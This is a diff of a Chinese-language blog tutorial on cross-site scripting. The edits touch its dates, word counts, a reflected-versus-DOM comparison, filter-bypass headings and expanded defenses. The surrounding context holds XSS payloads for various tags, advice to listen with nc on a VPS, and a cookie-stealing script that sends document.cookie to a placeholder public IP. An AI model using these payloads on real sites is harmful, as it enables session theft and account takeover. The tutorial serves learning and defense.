@@ -402,21 +402,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-21
+                    2023-07-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.4k
+                    2.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    10 分
+                    11 分
                 </div>
                 
 
@@ -438,7 +438,7 @@
             <div id="articleContent">
                 <h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>   XSS又叫CSS（Cross Site Script）是指恶意攻击者往Web页面里插入恶意Script代码<br>   当用户<code>浏览该页</code>时，其中的Script代码会被执行，从而达到恶意攻击用户的目的。<br>   xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，所以xss漏洞关键就是寻找参数未过滤的输出函数。<br>   常见的输出函数有：echo printf print print_r sprintf die var-dump var_export</p>
 <h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>（1）攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）<br>（2）诱使受害者打开受到攻击的服务器URL<br>（3）受害者在Web浏览器中打开URL时自动执行恶意脚本</p>
-<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><p>（1）反射型XSS：&lt;非持久化&gt;<br>需要欺骗用户自己去点击链接才能触发XSS代码，一般容易出现在搜索页面，由后端代码进行处理。<br>（2）存储型XSS：&lt;持久化&gt;<br>每当有用户访问污染页面的时候都会触发代码执行。代码存储在服务器数据库中，如在个人信息或发表文章等地方。<br>（3）DOM型XSS：<br>DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。<br>DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。<br>客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行。<br>如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。<br>一般是浏览器前端代码进行处理。</p>
+<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><p>（1）反射型XSS：&lt;非持久化&gt;<br>需要欺骗用户自己去点击链接才能触发XSS代码，一般容易出现在搜索页面，由后端代码进行处理。<br>（2）存储型XSS：&lt;持久化&gt;<br>每当有用户访问污染页面的时候都会触发代码执行。代码存储在服务器数据库中，如在个人信息或发表文章等地方。<br>（3）DOM型XSS：<br>DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。<br>DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。<br>客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行。<br>如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。<br>一般是浏览器前端代码进行处理。<br><em><strong>反射和dom的区别:<br>DOM-XSS是javascript处理输出， 而反射性xss是后台程序处理</strong></em></p>
 <h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>1.挂马<br>2.盗取用户Cookie。<br>3.DOS（拒绝服务）客户端浏览器。<br>4.钓鱼攻击，高级的钓鱼技巧。<br>5.删除目标文章、恶意篡改数据、嫁祸。<br>6.劫持用户Web行为，甚至进一步渗透内网。<br>7.爆发Web2.0蠕虫。<br>8.蠕虫式的DDoS攻击。<br>9.蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据</p>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>各种标签的XSS形式</strong></p>
 <pre><code>
@@ -493,7 +493,17 @@ onscroll=alert(1);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&g
 &lt;isindex type=image src=1 onerror=alert(1)&gt;//仅限于IE
 </code></pre>
 <p><strong>绕过过滤方法</strong></p>
-<pre><code>【空格过滤】
+<pre><code>【大小写】
+
+【没有分号】
+
+【Flash】
+
+【Fuzz进行测试】
+
+【双层标签绕过】
+
+【空格过滤】
 /**/注释符号绕过
 /符号绕过
 
@@ -596,7 +606,7 @@ Payload：&lt;details/open/ontoggle=(confirm)()//
 </code></pre>
 <h4 id="还有一些很重要的东西"><a href="#还有一些很重要的东西" class="headerlink" title="还有一些很重要的东西"></a>还有一些很重要的东西</h4><p>xss网站最好自己搭建一个，因为可能会过滤xss关键字<br>最好使用只带有数字的域名或ip<br>利用vps，用nc端口监听</p>
 <h4 id="XSStrike工具使用"><a href="#XSStrike工具使用" class="headerlink" title="XSStrike工具使用"></a>XSStrike工具使用</h4><p><a href="https://blog.csdn.net/RuoLi_s/article/details/113192507?ops_request_misc=&request_id=&biz_id=102&utm_term=XSStrike&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-113192507.nonecase&spm=1018.2226.3001.4187"><strong>使用说明</strong></a></p>
-<h4 id="XSS的防御措施"><a href="#XSS的防御措施" class="headerlink" title="XSS的防御措施"></a>XSS的防御措施</h4><p>（1）编码：对用户输入的数据进行HTML Entity编码<br>（2）过滤：移除用户上传的DOM属性，如onerror等，移除用户上传的style节点，script节点，iframe节点等。<br>（3）校正：避免直接对HTML Entity编码，使用DOM Prase转换，校正不配对的DOM标签。</p>
+<h4 id="XSS的防御措施"><a href="#XSS的防御措施" class="headerlink" title="XSS的防御措施"></a>XSS的防御措施</h4><p>（1）编码：对输入内容的特定字符进行编码，例如表示html标记的 &lt; &gt; 等符号<br>（2）过滤：移除用户上传的DOM属性，如onerror等，移除用户上传的style节点，script节点，iframe节点等。<br>（3）校正：避免直接对HTML Entity编码，使用DOM Prase转换，校正不配对的DOM标签。<br>（4）配置：对重要的cookie设置httpOnly, 防止客户端通过document.cookie读取 cookie<br>（5）不要使用Eval来解析并运行不确定的数据或代码，对于JSON解析请使用 JSON.parse()<br>方法。</p>
 <h4 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h4><pre><code>
 &lt;script&gt;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&lt;/script&gt;
 
@@ -917,7 +927,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">93.9k</span>
+                        class="white-color">94.9k</span>
             
             
             
